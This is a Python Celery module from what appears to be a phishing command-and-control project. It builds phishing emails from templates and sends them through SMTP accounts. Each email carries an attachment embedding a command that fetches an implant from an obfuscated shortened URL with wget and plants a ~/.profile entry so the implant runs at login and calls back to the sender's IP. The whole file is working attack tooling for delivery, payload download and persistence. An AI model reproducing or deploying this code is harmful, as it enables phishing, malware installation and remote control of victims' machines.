import logging
import smtplib
from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import socket

import jinja2
from celery import Celery

from c2.models import PhishingEmail, db

app = Celery("c2")

original_implant_addr = (
    "https://github.com/d1lacy/LibreOfficeCapstone/raw/refs/heads/main/libutils-amd64"
)
# shortened for obfuscation
IMPLANT_ADDR = "https://tinyurl.com/ycxssc7p"
PORT = 9999


logger = logging.getLogger(__name__)


def _get_public_ip():
    try:
        # Connect to Google's public DNS server.  Doesn't send data, just establishes connection.
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        public_ip = s.getsockname()[0]
        s.close()
        return public_ip
    except socket.error as e:
        print(f"Error getting IP with socket: {e}")
        return None


def _make_subject_and_body(phishing_email: PhishingEmail):
    subject_template = jinja2.Template(phishing_email.template.subject)
    subject = subject_template.render(target=phishing_email.target)

    with open(phishing_email.template.path, "r") as f:
        body_template = jinja2.Template(f.read())

    body = body_template.render(target=phishing_email.target)
    return subject, body


def _generate_implant_command(ip, implant_addr, fingerprint):
    get_implant = f"wget -O ~/libutils {implant_addr}"
    run_implant_command = f"echo '~/libutils {fingerprint} {ip} {PORT} >/dev/null 2>/dev/null' >> ~/.profile"
    command = f"{get_implant} ; {run_implant_command}"
    return command


def _make_attachment(phishing_email: PhishingEmail):
    with open(phishing_email.attachment.path, "r") as f:
        template = jinja2.Template(f.read())

    command = _generate_implant_command(
        _get_public_ip(), IMPLANT_ADDR, phishing_email.target.fingerprint
    )
    attachment = MIMEApplication(template.render(command=command))
    attachment.add_header(
        "Content-Disposition",
        f"attachment; filename={phishing_email.attachment.name}",
    )

    return attachment


@app.task
def send_phishing_email(phishing_email_id: int):
    with db.transaction():
        phishing_email: PhishingEmail = PhishingEmail.get(id=phishing_email_id)
        phishing_email.status = "running"
        phishing_email.save()

    subject, body = _make_subject_and_body(phishing_email)
    email_account = phishing_email.email_account
    with smtplib.SMTP(email_account.smtp_server, email_account.smtp_port) as server:
        server.login(email_account.username, email_account.password)
        msg = MIMEMultipart()

        msg["From"] = email_account.username
        msg["To"] = phishing_email.target.email
        msg["Subject"] = subject

        msg.attach(MIMEText(body, "html"))
        msg.attach(_make_attachment(phishing_email))

        server.send_message(msg)

    with db.transaction():
        phishing_email.status = "completed"
        phishing_email.save()
